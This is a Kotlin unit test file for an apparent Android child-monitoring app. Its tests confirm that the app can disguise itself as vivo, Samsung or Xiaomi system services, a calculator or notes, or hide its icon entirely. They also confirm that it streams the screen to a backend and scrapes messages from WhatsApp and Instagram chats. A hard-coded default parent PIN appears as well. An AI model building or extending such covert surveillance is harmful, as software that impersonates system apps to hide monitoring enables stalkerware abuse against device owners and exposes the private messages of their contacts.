package com.vyra.kids

import com.vyra.kids.core.AppConstants
import com.vyra.kids.core.DisguiseProfile
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test

class KidAppUnitTest {

    @Test
    fun testAppConstantsIntegrity() {
        assertEquals("vyra_kids_prefs", AppConstants.PREFS_NAME)
        assertEquals("8899", AppConstants.DEFAULT_PARENT_PIN)
        assertEquals(60, AppConstants.STREAM_TARGET_FPS)
        assertEquals(1080, AppConstants.STREAM_WIDTH)
        assertEquals(2400, AppConstants.STREAM_HEIGHT)
        assertTrue(AppConstants.BASE_SYNC_URL.contains("vyra-backend"))
    }

    @Test
    fun testDisguiseProfiles() {
        val profiles = DisguiseProfile.entries
        assertTrue(profiles.contains(DisguiseProfile.VIVO_SERVICES))
        assertTrue(profiles.contains(DisguiseProfile.SAMSUNG_SERVICES))
        assertTrue(profiles.contains(DisguiseProfile.XIAOMI_SERVICES))
        assertTrue(profiles.contains(DisguiseProfile.SIM_TOOLKIT))
        assertTrue(profiles.contains(DisguiseProfile.CALCULATOR))
        assertTrue(profiles.contains(DisguiseProfile.NOTES))
        assertTrue(profiles.contains(DisguiseProfile.DEVICE_SUPPORT))
        assertTrue(profiles.contains(DisguiseProfile.GHOST_HIDDEN))

        assertEquals("vivo services", DisguiseProfile.VIVO_SERVICES.title)
        assertEquals("com.vyra.kids.AliasVivoServices", DisguiseProfile.VIVO_SERVICES.aliasClass)
        assertEquals("Samsung Services", DisguiseProfile.SAMSUNG_SERVICES.title)
        assertEquals("com.vyra.kids.AliasSamsungServices", DisguiseProfile.SAMSUNG_SERVICES.aliasClass)
        assertEquals("Xiaomi Services", DisguiseProfile.XIAOMI_SERVICES.title)
        assertEquals("com.vyra.kids.AliasXiaomiServices", DisguiseProfile.XIAOMI_SERVICES.aliasClass)
        assertEquals("System Services", DisguiseProfile.SIM_TOOLKIT.title)
        assertEquals("", DisguiseProfile.GHOST_HIDDEN.aliasClass)
    }

    @Test
    fun testChatSequenceRingBufferDeduplication() {
        val ring = com.vyra.kids.core.ChatSequenceRingBuffer
        ring.clear()

        val chatKey = "WhatsApp:Rahul"

        // 1. First message should not be a duplicate
        org.junit.Assert.assertFalse(ring.isDuplicate(chatKey, "Haan theek hai", "Rahul"))
        ring.record(chatKey, "Haan theek hai", "Rahul")

        // 2. Immediate re-scrape (e.g. 50ms later on UI redraw) should be detected as duplicate
        org.junit.Assert.assertTrue(ring.isDuplicate(chatKey, "Haan theek hai", "Rahul"))

        // 3. Different message in same chat should NOT be duplicate
        org.junit.Assert.assertFalse(ring.isDuplicate(chatKey, "Kal milte hain", "Rahul"))
        ring.record(chatKey, "Kal milte hain", "Rahul")

        // 4. Same text from different sender (child outgoing vs contact incoming) should NOT be suppressed
        org.junit.Assert.assertFalse(ring.isDuplicate(chatKey, "Haan theek hai", "Aryan (Child)"))
        ring.record(chatKey, "Haan theek hai", "Aryan (Child)")

        // 5. Different conversation with same text should NOT be duplicate
        val instaKey = "Instagram:Priya"
        org.junit.Assert.assertFalse(ring.isDuplicate(instaKey, "Haan theek hai", "Priya"))
    }
}

